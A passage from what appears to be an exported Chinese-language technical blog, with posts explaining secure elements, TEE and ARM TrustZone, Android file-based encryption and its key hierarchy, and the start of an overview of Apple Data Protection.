alt=\"SE.png\"></p>\n<p>从产品形态上，SE可以分为三种：</p>\n<ul>\n<li>UICC：也称通用集成电路卡，就是电信运营商发布和使用的手机SIM卡</li>\n<li>Embedded SE：嵌入式SE，以一个独立芯片的形式集成在设备的主板上，例如iPhone手机上集成的NXP SN200系列芯片（带NFC功能）</li>\n<li>Micro SD：以SD存储卡的形式存在，通过插入SD卡槽集成到手机上，由独立的SE制造商制造和销售，由于安全和性能问题现已基本淘汰</li>\n</ul>\n<p>此外，银行系统的U盾也被认为是SE的一种形态，其核心就是一块智能卡芯片，但是集成了电子数字证书与签名秘钥等更多安全能力。<br>SE提供了非常可靠的安全等级，但保存在其中的数据和程序需要有更新机制，一般是通过TSM（Trusted Service Manager）来实现的。</p>\n<h2 id=\"二、TEE-可信执行环境\"><a href=\"#二、TEE-可信执行环境\" class=\"headerlink\" title=\"二、TEE - 可信执行环境\"></a>二、TEE - 可信执行环境</h2><p>随着智能终端的普及发展，越来越多的终端设备运行在复杂的开放环境之中，仅仅依赖Android等软件技术显然无法提供足够的安全强度，但基于Secure Element的安全技术在集成难度和成本上也存在困难，例如小额支付、版权保护、企业VPN等典型应用的安全保护强度并不高，为此迫切需要在安全性能和成本之间找到平衡点，开发一种“合适强度”的安全架构。<br><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/vs.png\" alt=\"vs.png\"></p>\n<p>2006年，OMTP工作组智能终端的安全率先提出了一种双系统解决方案：即在同一个智能终端下，除了多媒体操作系统外再提供一个隔离的安全操作系统，这一运行在隔离的硬件之上的隔离安全操作系统用来专门处理敏感信息以保证信息的安全。该方案即TEE的前身。</p>\n<p>2013年，Global Platform（GP）提出了可信执行环境（TEE，Trusted Execution Environment）的概念，即不需要独立的物理芯片，而是在通用CPU内核上扩展出的安全可执行模式。</p>\n<p>与REE (Rich Execution Environment)对应，TEE是与设备上的Rich OS（通常是Android等）并存的运行环境，通常具有其自身的执行空间，为Rich OS运行某些关键操作（指纹验证、PIN码输入、私钥存储、证书存储、数字版权保护等）提供安全服务，例如：</p>\n<p><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/TEE.png\" alt=\"TEE.png\"></p>\n<p>GP在TEE的标准化方面下足了工夫，定义了一系列技术规范：</p>\n<ul>\n<li>Internal API：负责为可信应用TA提供对安全资源和服务的访问，包括密钥注入和管理、加密、安全存储、安全时钟、可信用户界面（UI）和可信键盘等</li>\n<li>Client API：是让运行在Rich OS中的客户端应用（CA）访问TA服务和数据的底层通信接口</li>\n<li>Functional API：包括应用管理、调试功能、安全保护轮廓等</li>\n</ul>\n<p>TEE环境比Rich OS(普通操作系统)的安全级别更高，略差于安全元件SE，但成本显著降低，其核心特征是：</p>\n<ul>\n<li>TEE具有其自身的执行空间，也就是说在TEE的环境下有一个独立的操作系统，如seL4微内核</li>\n<li>TEE所能访问的硬件资源是与Rich OS分离的，拥有独立的MCU、DRAM、SRAM等</li>\n<li>TEE提供了授权安全软件(TrustApp可信应用，简称TA)的安全执行环境，同时也保护TA的资源和数据的保密性、完整性和访问权限。为了保证TEE本身的可信根，TEE在安全启动过程中是要通过验证并且与Rich OS隔离的</li>\n<li>在TEE中，每个TA是相互独立的，而且不能在未授权的情况下互相访问。简而言之就是在TEE环境的操作系统上同样有相应的应用程序(TA)，除了TEE的运行环境与普通操作系统相互独立外，TEE里的每一个TA也是需要授权并相互独立运行的。</li>\n</ul>\n<h2 id=\"三、ARM-TrustZone\"><a href=\"#三、ARM-TrustZone\" class=\"headerlink\" title=\"三、ARM TrustZone\"></a>三、ARM TrustZone</h2><p>TEE是一种基于通用CPU内核的嵌入式硬件技术，因此不同CPU指令集上必然有着相应的技术实现，包括：</p>\n<ul>\n<li>AMD PSP（Platform Security Processor）处理器</li>\n<li>ARM TrustZone技术（支持TrustZone的所有ARM处理器）</li>\n<li>Intel x86-64指令集：SGX Software Guard Extensions</li>\n<li>MIPS：虚拟化技术Virtualization</li>\n</ul>\n<p>ARM架构的处理器是智能终端市场的绝对霸主，也是TEE技术的主导者之一。2006年，ARM提出了硬件虚拟化技术<strong>TrustZone</strong>，通过引入安全扩展成为所有Cortex-A 类处理器的基本功能，随后ARM将其 TrustZone API 提供给 GlobalPlatform，也就是 TEE 的 Client API。</p>\n<p><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/el3-aarch64.png\" alt=\"el3-aarch64.png\"><br>TrustZone-A引入了安全世界（secure world）和非安全世界（none secure world）的概念，并且能够通过读取SCR（Secure Configuration Register）寄存器的第33位NS（None Secure）比特位进行判断。并且该值可用于外设总线（即通过NS比特位判断哪些设备是安全设备，只能在安全世界进行访问，在硬件层面对外设寄存器的访问进行了限制），以及管控对内存区域的访问（哪片地址空间只能够在安全世界访问，而非安全世界无权访问）。</p>\n<p>此外，Cortex-A为CPU引入了新的Monitor Mode模式。Monitor模式是作为安全世界和非安全世界间沟通的存在，无论是从安全世界退出到非安全世界，还是从非安全世界进入安全世界都要经过Monitor模式。从官方的介绍可知，从非安全世界和安全世界进入Monitor Mode有两种方式，一种是通过SMC（Secure Monitor Call）指令，另一种方式是通过在安全世界注册的中断。</p>\n<pre><code>从成本的角度出发，大多数支持TrustZone的CPU芯片采用虚拟化的方案，即将全部或某些物理核虚拟为一个非安全核和一个安全核，以基于时间片的方式轮流占用物理核，并通过Monitor Mode在安全世界和非安全世界之间切换。当然，如果不差钱也可以指定若干内核专门运行安全世界，也就是协处理器的方案\n</code></pre>\n<p>总结一下，ARM Trustzone不具体指一个硬件或软件，而是一个技术架构，在支持ARM Trustzone的SOC中，需按照ARM Trustzone技术对各个子模块进行设计。下图就是一个支持Trustzone架构的SOC设计框图。</p>\n<p><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/soc.png\" alt=\"soc.png\"></p>\n<p>需要指出的是，由于Apple、华为、高通等公司的自研CPU芯片都是基于ARM授权，由此Apple的Secure Enclave、高通的QSE等技术就是TrustZone的变种。<br>例如，华为鲲鹏服务器推出的TrustZone套件，就是一个以ARM TrustZone为技术实现基础，由硬件(包括BIOS、BMC)、机密计算运行环境，以及配套的 patch、应用开发指导和应用打包工具等组成的端到端的解决方案。<br><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/kunpeng.png\" alt=\"kunpeng.png\"></p>\n<hr>\n<h2 id=\"附录一：Android设备的指纹识别\"><a href=\"#附录一：Android设备的指纹识别\" class=\"headerlink\" title=\"附录一：Android设备的指纹识别\"></a>附录一：Android设备的指纹识别</h2><p>Android设备的指纹识别，依赖TEE来实现用户指纹认证，要求指纹采集、注册和识别都必须在TEE内部进行，已保证安全。</p>\n<p>Android从4.0开始引入了KeyStore，开发者可以使用KeyStore API生成密钥、使用密钥签名、使用密钥加解密、获取密钥的属性信息，但无法将密钥本身从KeyStore中取出。因为密钥不进入应用进程，这大大提高了密钥的安全性。随着Android版本更迭，KeyStore的实现不断进化得更加安全，在有些设备上，不仅密钥不进入应用进程，甚至不进入Android OS只存储在TEE或SE中，接下来我们大概列举下KeyStore的进化。</p>\n<ul>\n<li>4.0：创世版本，密钥使用用户的passcde加密后存储，支持RSA、ECDSA</li>\n<li>4.1：增加了使用安全硬件的基础设施，在可能的情况下密钥会被存储到安全硬件中</li>\n<li>6.0：增加支持AES、HMAC；增加了密钥绑定用户认证的能力，即可以指定某些密钥，在每一次使用时，必须由用户进行认证（指纹、passcode等）</li>\n<li>7.0：强制要求预装7.0系统的设备必须拥有安全硬件并且支持基于安全硬件的KeyStore</li>\n<li>8.0：增加了设备证明（Key Attestation）能力，开发者可通过验证Key Attestation的证书链，来确认密钥的确保存在了安全硬件中</li>\n</ul>\n<p><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/finger.png\" alt=\"finger.png\"></p>\n<h2 id=\"附录二：微内核\"><a href=\"#附录二：微内核\" class=\"headerlink\" title=\"附录二：微内核\"></a>附录二：微内核</h2><p>与微内核对应的是宏内核，典型产品就是Linux。</p>\n<p>宏内核被视作为运行在单一地址空间的单一的进程，内核提供的所有服务，都以特权模式，在这个大型的内核地址空间中运作，这个地址空间被称为内核态（kernel space）。<br>宏内核通常以单一静态二进制文件的方式被存储在磁盘，或是缓冲存储器上，在引导之后被加载存储器中的内核态，开始运作。<br>宏内核的优点是设计简单。在内核之中的通信成本很小，内核可以直接调用内核态内的函数，跟用户态的应用程序调用函数一样，因此它的性能很好。在1980年代之前，所有的操作系统都采用这个方式实现；即使到了现在，主要的操作系统也多采用这个方式。</p>\n<p>与之相对，微内核的支持者认为，宏内核的移植性不佳，操作系统的代码高度耦合，很难适配不同的CPU架构，此外，所有的模块也都在同一块寻址空间内执行，倘若某个模块有错误，执行时就会损及整个操作系统运作。<br>微内核的设计理念，是将系统服务的实现，与系统的基本操作规则区分开来。它实现的方式，是将核心功能模块化，划分成几个独立的进程，各自运行，这些进程被称为服务（service）。所有的服务进程，都运行在不同的地址空间。只有需要绝对特权的进程，才能在具特权的执行模式下运行，其余的进程则在用户空间运行。</p>\n<p>第一代微内核，在内核提供了较多的服务，因此被称为“胖微内核”，它的典型代表是Mach，它既是GNU HURD也是Mac OS X的内核。<br>第二代微内核只提供最基本的OS服务，典型的OS是QNX，QNX在黑莓手机BlackBerry 10系统中被采用。L4微内核系列也是著名的微核心</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">微内核OS</th>\n<th align=\"center\">通信机制</th>\n<th align=\"center\">性能</th>\n<th align=\"center\">安全性</th>\n<th align=\"center\">可靠性</th>\n<th align=\"center\">可拓展性</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">Mach</td>\n<td align=\"center\">共享内存，同步</td>\n<td align=\"center\">☆☆</td>\n<td align=\"center\">×</td>\n<td align=\"center\">☆☆</td>\n<td align=\"center\">☆</td>\n</tr>\n<tr>\n<td align=\"center\">L4</td>\n<td align=\"center\">共享内存，异步</td>\n<td align=\"center\">☆☆☆</td>\n<td align=\"center\">×</td>\n<td align=\"center\">☆☆</td>\n<td align=\"center\">☆☆</td>\n</tr>\n<tr>\n<td align=\"center\">seL4</td>\n<td align=\"center\">同步和异步端点</td>\n<td align=\"center\">☆☆☆☆</td>\n<td align=\"center\">√</td>\n<td align=\"center\">☆☆☆</td>\n<td align=\"center\">☆☆☆</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.cnblogs.com/blogernice/articles/14942270.html\">ARM TrustZone的深度解析</a></li>\n<li><a href=\"https://aijishu.com/a/1060000000320633\">ARM Trustzone的安全扩展资料大全</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/471110552\">从可信计算到机密计算 - 冯登国</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/34813040\">网银U盾安全认证原理解析</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/384966998\">隐私计算技术之可信执行环境（TEE）</a></li>\n<li><a href=\"https://hack-big.tech/2021/01/23/Microcontroller-TrustZone%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/\">TrustZone-M简介</a></li>\n<li><a href=\"https://www.laoyaoba.com/html/share/news?source=pc&news_id=583957\">从TrustZone建置安全验证硬件基础 - FIDO联盟</a></li>\n<li><a href=\"https://www.cnblogs.com/hjbf/p/13298964.html\">ARM cortex三个版本A，R, M之间区别</a></li>\n<li><a href=\"https://blog.csdn.net/xiasli123/article/details/105191368\">微内核发展史与Mach、L4、seL4微内核OS的比较</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"%E5%88%9B%E6%96%B0%E5%8F%91%E5%B1%95%E4%B8%AD%E7%9A%84%E5%8F%AF%E4%BF%A1%E8%AE%A1%E7%AE%97%E7%90%86%E8%AE%BA%E4%B8%8E%E6%8A%80%E6%9C%AF-%E5%86%AF%E7%99%BB%E5%9B%BD.pdf\">创新发展中的可信计算理论与技术 - 冯登国</a></li>\n<li><a href=\"%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%9A%94%E7%A6%BB%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E7%BB%BC%E8%BF%B0.pdf\">系统安全隔离技术研究综述 - 郑显义</a></li>\n<li><a href=\"https://res-www.zte.com.cn/mediares/magazine/publication/com_cn/article/201505/445481/P020151028370420765032.pdf\">安全可信智能移动终端研究 - 张大伟</a></li>\n<li><a href=\"https://www.trustkernel.com/uploads/pubs/TEE-%E4%BB%8E%E6%89%8B%E6%9C%BA%E7%AB%AF%E5%88%B0%E4%BA%91%E7%AB%AF%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%A2%9E%E5%BC%BA.pdf\">TEE：从手机端到云端的系统安全增强</a></li>\n<li><a href=\"https://support.huaweicloud.com/twp-kunpengcctrustzone/twp-kunpengcctrustzone.pdf\">鲲鹏 BoostKit 机密计算 TrustZone 套件 技术白皮书</a></li>\n<li><a href=\"%E4%BD%BF%E7%94%A8NXP_%E5%AE%89%E5%85%A8MCU_LPC54S0xx_%E6%9E%84%E5%BB%BA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F.pdf\">使用NXP 安全MCU LPC54S0xx 构建安全系统</a></li>\n<li><a href=\"seL4-whitepaper.pdf\">SEL4技术白皮书-英文版</a></li>\n<li><a href=\"RISC-V%E8%8A%AF%E7%89%87%E7%9A%84%E5%8A%A0%E5%AF%86%E5%8D%8F%E5%A4%84%E7%90%86%E5%99%A8%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%A1%88.pdf\">RISC-V芯片的加密协处理器设计方案</a></li>\n</ul>\n"},{"title":"Android 文件级加密技术分析","url":"/2024/05/03/Android-%E6%96%87%E4%BB%B6%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<p>Full-Disk Encryption（全盘加密）是一种单密钥的加密系统，有硬件、软件两种实现方案。</p>\n<ul>\n<li>硬件方案：也称为 Self Encryption Drive（自加密硬盘），一般由存储器件厂商、安全厂商提供，出厂时内嵌预启动环境 bootLoader，上电后先运行 Pre-Boot 程序并验证 AK（Authentication Key），再进行正常的加载引导。请参见<a href=\"https://csrc.nist.gov/csrc/media/projects/cryptographic-module-validation-program/documents/security-policies/140sp1299.pdf\">Seagate 硬盘 的 NIST FIPS 140-2 认证报告</a>。</li>\n<li>软件方案：采用不加密boot分区的方式，一般在 initial ramdisk 集成 PBA 功能并完成验证。例如 Windows 的BitLocker、Apple 的 FileVault、以及 Linux 的 dm-crypt&#x2F;LUKS。</li>\n</ul>\n<p>File-Based Encryption 是一种多密钥的加密系统，又称 Filesystem-Level Encryption（文件系统加密）。相比于 FBE，第二个名字更能体现方案基于文件系统的技术特点。而其基于文件系统的特点，一方面决定了只能由软件实现，另一方面决定了各方案差异也主要在文件系统，有两种类型：</p>\n<ul>\n<li>Stackable cryptographic filesystem（堆叠加密文件系统）：新增一个加解密文件系统，堆叠在现有存储软件栈的某一层。例如 Linux 内核自 v2.6.19 开始支持，已很成熟稳定的 <a href=\"https://www.kernel.org/doc/html/v5.7/filesystems/ecryptfs.html\">eCryptfs</a> 方案，就是在 VFS -&gt; Native FS 层之间加入新加解密文件系统支持。类似还有基于用户态文件系统 <a href=\"https://zh.wikipedia.org/wiki/FUSE\">FUSE - Filesystem in Userspace</a>的各种方案。</li>\n<li>Native filesystem with encryption（原生加密文件系统）：在现有文件系统中引入加解密功能。例如 Linux 内核自 v4.1 支持的 Ext4 文件系统加密，自 v4.2 支持的 <a href=\"https://www.kernel.org/doc/html/v5.7/filesystems/f2fs.html\">F2FS 文件系统</a>加密，自 v4.10 后支持的 UBIFS 文件系统加密。需要说明的是，内核中 Ext4、F2FS、ubifs 共用加解密功能模块，即内核 <a href=\"https://www.kernel.org/doc/html/v4.18/filesystems/fscrypt.html\">fscrypt</a> 特性。</li>\n</ul>\n<p>和 FDE 方案相比，FBE 有几个显著的特点：</p>\n<ul>\n<li>支持单独的目录或文件加密，方便灵活使用配置。只加密目标对象，不加密整个磁盘，降低了系统加解密负载开销。</li>\n<li>支持不同目录&#x2F;文件使用不同加密密钥。</li>\n<li>加密目录和非加密目录并存（甚至一个加密目录中加密和非加密文件也可以并存）。加密目录文件的备份传输灵活方便。</li>\n</ul>\n<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Android 设备可以访问和存储用户的个人隐私数据，如果设备一旦丢失，会极大的增加用户数据泄露的风险。从 Android 4.4 开始，Google 相继推出多种加密方案：</p>\n<ul>\n<li>Android 5.0 到 Android 9 支持 FDE 加密方案</li>\n<li>Android 7.0 及更高版本支持 FBE 加密方案</li>\n<li>Android 9 引入了 ME（Metadata Encryption，文件元数据加密），但需要硬件支持</li>\n</ul>\n<p>为了安全地使用 AOSP 的 FBE 实现，设备需要满足以下依赖关系：</p>\n<ul>\n<li>对 Ext4 加密或 F2FS 加密的内核支持</li>\n<li>基于 1.0 或更高版本 HAL 的 Keymaster 支持，不支持 Keymaster 0.3</li>\n<li>必须在可信执行环境 (TEE) 中实现 Keymaster&#x2F;Keystore 和 Gatekeeper，以便为 DE 密钥提供保护，从而使未经授权的操作系统（刷写到设备上的定制操作系统）无法直接请求 DE 密钥</li>\n<li>硬件信任根和启动时验证需要绑定到 Keymaster 初始化进程，以确保未经授权的操作系统无法获取 DE 密钥</li>\n</ul>\n<h2 id=\"二、技术架构\"><a href=\"#二、技术架构\" class=\"headerlink\" title=\"二、技术架构\"></a>二、技术架构</h2><p>Android FBE 特性依赖 UFS（Universal Flash Storage，通用闪存存储） 和 TEE（Trusted Execution Environment，可行执行环境）。其中，TEE 提供基于硬件环境的 KMS（Key Management Service），该服务提供密钥操作，如密钥创建（Key Generation）、密钥派生（Key Derivation）、密钥编程（Key Programming）等；UFS 包括 UFS Core 和 UFS Device，UFS Controller 工作在 UFS Core 内部，用于接收来自 AP 的数据和命令。</p>\n<p><img src=\"/2024/05/03/Android-%E6%96%87%E4%BB%B6%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/arch.jpg\" alt=\"ARCH\"><br>ICE &#x3D; Inline Crypto Engine（内联加密引擎），KSM &#x3D; KeySlot Manager（密钥槽管理器）<br>TA &#x3D; Trusted Application（可信应用），HAL &#x3D; Hardware Abstract Layer（硬件抽象层）</p>\n<h2 id=\"三、实现方案\"><a href=\"#三、实现方案\" class=\"headerlink\" title=\"三、实现方案\"></a>三、实现方案</h2><p>AOSP 实现基于 Linux 内核的 fscrypt 特性（受 ext4 和 f2fs 支持），并通常配置如下：</p>\n<ul>\n<li>借助采用 XTS 模式的 AES-256 算法加密文件内容</li>\n<li>借助采用 CBC-CTS 模式的 AES-256 算法加密文件名</li>\n<li>对于部分 CPU 不支持 AES 指令的早期设备，AOSP 提供了 Adiantum 加密方法</li>\n</ul>\n<p>Android 根据文件内容的私密性，把用户数据分区的存储位置划分安全等级，包括下几类：</p>\n<ul>\n<li>Unencrypted Storage：不加密的存储位置。iOS 没有该类型。</li>\n<li>System Device Encrypted (DE) Storage ：相当于 Class D。一般存储一些设备相关，Framework 相关等用户无关的数据。</li>\n<li>Device Encrypted (DE) Storage ：相当于 Class C，与用户相关的数据，安全性要求一般，在设备启动后以及用户解锁设备后都可以直接访问。</li>\n<li>Credential Encrypted (CE) Storage ：相当于 Class A，与用户密切相关的数据，安全性等级高，如果用户设置了锁屏密码，必须在用户解锁设备后这些存储位置的数据才可用。</li>\n<li>Android 没有相当于 Class B 的类型，可以用 DE 替代。</li>\n</ul>\n<p><img src=\"/2024/05/03/Android-%E6%96%87%E4%BB%B6%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/android.jpg\" alt=\"A\"></p>\n<p>不同的 Storage 使用不同密钥。其中，System DE Storage 对应 SYSTEM_DE_KEY，User DE Storage 对应USER_DE_KEY，User CE Storage 对应 USER_CE_KEY。请参见<a href=\"https://source.android.com/docs/security/features/encryption/file-based?hl=zh-cn#key-storage-and-protection\">官方文档</a></p>\n<h2 id=\"四、密钥层次结构\"><a href=\"#四、密钥层次结构\" class=\"headerlink\" title=\"四、密钥层次结构\"></a>四、密钥层次结构</h2><p>可以利用 HKDF 等 KDF（密钥派生函数）从其他密钥派生密钥，从而生成密钥层次结构。</p>\n<h3 id=\"不使用硬件封装密钥\"><a href=\"#不使用硬件封装密钥\" class=\"headerlink\" title=\"不使用硬件封装密钥\"></a>不使用硬件封装密钥</h3><p><img src=\"/2024/05/03/Android-%E6%96%87%E4%BB%B6%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/fbe-key-hierarchy-standard.png\" alt=\"SW-key\"></p>\n<p>FBE 类密钥是 Android 传递给 Linux 内核以解锁一组特定加密目录（例如针对特定 Android 用户的凭据加密存储空间）的原始加密密钥。（在此内核中，这种密钥称为 fscrypt 主密钥）。内核会根据该密钥派生以下子密钥：</p>\n<ul>\n<li>密钥标识符。此标识符不用于加密，而是作为一个值用于标识保护特定文件或目录的密钥。</li>\n<li>文件内容加密密钥</li>\n<li>文件名加密密钥</li>\n</ul>\n<h3 id=\"使用硬件封装密钥\"><a href=\"#使用硬件封装密钥\" class=\"headerlink\" title=\"使用硬件封装密钥\"></a>使用硬件封装密钥</h3><p><img src=\"/2024/05/03/Android-%E6%96%87%E4%BB%B6%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/fbe-key-hierarchy-hw-wrapped.png\" alt=\"HW-key\"></p>\n<p>与前一种情况相比，此密钥层次结构新增了一个额外级别，并且改变了文件内容加密密钥的位置。根节点仍代表由 Android 传递到 Linux 以解锁一组加密目录的密钥。但是，该密钥现在采用<strong>临时封装</strong>形式，并且必须传给<strong>专用硬件</strong>才能使用。该硬件必须实现两个获取一个临时封装密钥的接口：</p>\n<ul>\n<li>第一个接口用于派生<code>inline_encryption_key</code>并将其直接编程到内嵌加密引擎的密钥槽。这样，软件无需访问原始密钥，即可加密&#x2F;解密文件内容。在 Android 通用内核中，此接口与<code>blk_crypto_ll_ops::keyslot_program</code>操作相对应，此操作必须由存储驱动程序实现。</li>\n<li>第二个接口用于派生并返回<code>sw_secret</code>（“软件 Secret”，在某些地方也称为“原始 Secret”），后者作为一个密钥由 Linux 用于为文件内容加密之外的所有加密派生子密钥。在 Android 通用内核中，此接口与 <code>blk_crypto_ll_ops::derive_sw_secret</code> 操作相对应，此操作必须由存储驱动程序实现。</li>\n</ul>\n<p>如需从原始存储密钥派生<code>inline_encryption_key</code>和<code>sw_secret</code>，硬件必须使用强加密 KDF。此 KDF 必须遵循加密最佳实践；至少具有 256 位的安全性，也就是说，足以应对以后使用的任何算法。在派生每种类型的子密钥时，此 KDF 还必须使用不同的标签、上下文和&#x2F;或应用特定信息字符串，以确保生成的子密钥经过加密隔离，也就是说，知道其中一个子密钥并不会泄露任何其他子密钥。原始存储密钥已是均匀随机密钥，因此不需要延伸密钥。</p>\n<p>从技术上讲，可以使用任何满足安全要求的 KDF。但是，出于测试目的，需要在测试代码中重新实现相同的 KDF。目前，已审核并实现了一个 KDF；可以在<a href=\"https://android.googlesource.com/platform/test/vts-testcase/kernel/+/4be1bd95bb9879375bd3f12089b0bc156529f19f/encryption/utils.cpp#402\">vts_kernel_encryption_test 的源代码</a>中找到该 KDF。建议硬件使用此 KDF，此 KDF 使用 <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-108.pdf\">NIST SP 800-108“计数器模式的 KDF”</a>，并将 AES-256-CMAC 作为 PRF。请注意，为确保兼容性，该算法的所有部分都必须完全相同，包括为每个子密钥选择的 KDF 上下文和标签。</p>\n<hr>\n<h2 id=\"附录：F2FS-文件系统\"><a href=\"#附录：F2FS-文件系统\" class=\"headerlink\" title=\"附录：F2FS 文件系统\"></a>附录：F2FS 文件系统</h2><p>F2FS - Flash Friendly File System 是三星开发的、专门为闪存设备设计的开源 Flash 文件系统。</p>\n<p>F2FS将整个卷切分成大量的 Segments，每个 Segment 的大小固定为 2MB。连续若干个 Segments 构成 Section，连续若干个 Section 构成 Zone。F2FS 文件系统将整个卷切分成 6 个区域，除了超级块（Superblock，简称SB）外，其余每个区域都包含多个 Segments，其结构如下图所示:<br><img src=\"/2024/05/03/Android-%E6%96%87%E4%BB%B6%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/F2FS.jpg\" alt=\"F2FS\"></p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.bilibili.com/read/cv24307831/\">详解Linux内核安全技术 - 磁盘加密技术概述</a></li>\n<li><a href=\"https://blog.csdn.net/feelabclihu/article/details/131016357\">Android系统安全技术 - FBE密钥框架和技术详解</a></li>\n<li><a href=\"https://www.kaotenforensic.com/android/android_encryption/\">Android 檔案系統加密機制</a></li>\n<li><a href=\"https://www.kaotenforensic.com/android/booting-partitions/\">Android 系統基本架構 - 開機流程與分區說明</a></li>\n<li><a href=\"https://page.om.qq.com/page/O3yauEIx2l-9WrUkHgQgRUBw0\">你的安卓手机究竟是FDE加密还是FBE加密？</a></li>\n</ul>\n<h3 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h3><ul>\n<li><a href=\"https://source.android.com/docs/security/features/encryption/file-based?hl=zh-cn\">FBE 文件级加密原理 - Android官方</a></li>\n</ul>\n"},{"title":"Apple Data Protection的功能概览","url":"/2024/01/27/Apple%20Data%20Protection%E7%9A%84%E5%8A%9F%E8%83%BD%E6%A6%82%E8%A7%88/","content":"<p>长期以来 Apple 公司有两条数据安全的技术演进路线，iPhone 和 iPad 等智能终端设备使用称为<strong>数据保护（Data Protection）</strong>的文件加密方法，基于Intel的Mac设备通过<strong>文件保险箱（FileVault）</strong>的宗卷加密技术。</p>\n<p>MacOS 和 iOS 都是基于 FreeBSD 发展而来，基础架构是一个多用户的操作系统，但 iPhone 等作为个人化（无需支持多用户）的终端设备，存储了通信录、照片等非常敏感的隐私数据，对数据保护的要求更高；其次，App Store 和 iCloud等云服务大量出现，在网络开放环境下既要支持便利的后台服务管理，又要解决数据迁移过程中的数据保护，对数据保护的技术方案提出了新要求；最后，跨平台的生态系统需要密切协同（例如多个不同设备之间需要共享邮箱账号和密码），需要解决服务协同与数据安全的矛盾。</p>\n<p>数据保护的技术实现离不开关键的硬件支持！限于技术演进和商业利益，早期的 Mac 设备基于 Intel CPU，早期的 iPhone 也采用 ARM6 和 ARM7 CPU，其底层架构难以满足数据保护的技术需求，为此 Apple 先后推出了适配 iPhone 的 A 系列 CPU 和适配 Mac 设备的 T 系列增强型安全芯片，依托自主研发的 Secure Encalve 为数据保护技术提供底层硬件支持，同时结合操作系统内核技术和 APP 沙盒技术等，确保只有受信任的代码及App可以在设备上运行（典型成果就是流行一时的 iPhone 越狱已经成为历史！），并有效提升了安全启动链、系统安全性和App安全性功能。</p>\n<p>FileVault 是一个单密钥的 FDE 系统，可以认为是 FBE 系统的早期简化版本，随着 M1 自研芯片和 APFS 文件系统的推出，上述两条技术路线正在逐步融合，搭载 Apple 芯片的 Mac 设备已经使用两者的混合模型。</p>\n<p>根据Apple 官方文档，Data Protection 数据保护技术的设计目标包括：</p>\n<ul>\n<li>在硬件被改动的情况下也能保护数据（替换组件&#x2F;直接读取闪存等）</li>\n<li>对抗离线攻击（物理方式获取闪存内的数据后用更强大的计算设备进行破解）</li>\n<li>对不同的数据提供不同级别的保护（锁屏之后有些数据要保护，有些数据还需要访问）</li>\n<li>需要时能够快速安全清除所有数据</li>\n<li>考虑性能和功耗</li>\n</ul>\n<h2 id=\"一、文件数据保护\"><a href=\"#一、文件数据保护\" class=\"headerlink\" title=\"一、文件数据保护\"></a>一、文件数据保护</h2><p>iOS 的所有用户数据文件都是加密存储的，Mac的情况复杂一些，文件系统加密是可选的，但USB外接存储就没有必要了。主要设计思想是：</p>\n<ul>\n<li>每个文件创建时会生成一个<code>Per-file Key</code>，在文件写入闪存时通过硬件用<code>AES-XTS</code>加密</li>\n<li><code>Per-file Key</code>存储在文件的元数据 (Metadata) 中，被<code>Class Key</code>和<code>Filesystem Key</code>加密</li>\n<li><code>Class Key</code>和<code>Filesystem Key</code>都被硬件密钥<code>UID</code>保护</li>\n<li><code>Class Key</code>还被用户密码<code>Passcode</code>保护</li>\n</ul>\n<p><img src=\"/2024/01/27/Apple%20Data%20Protection%E7%9A%84%E5%8A%9F%E8%83%BD%E6%A6%82%E8%A7%88/KEY-ARCH.jpg\" alt=\"key\"></p>\n<blockquote>\n<p>EMF Key 就是加密封装的 Filesystem Key，存储在闪存的可擦除区域，只允许安全隔区访问<br>Class Key 通过多层加密封装，持久化存储在 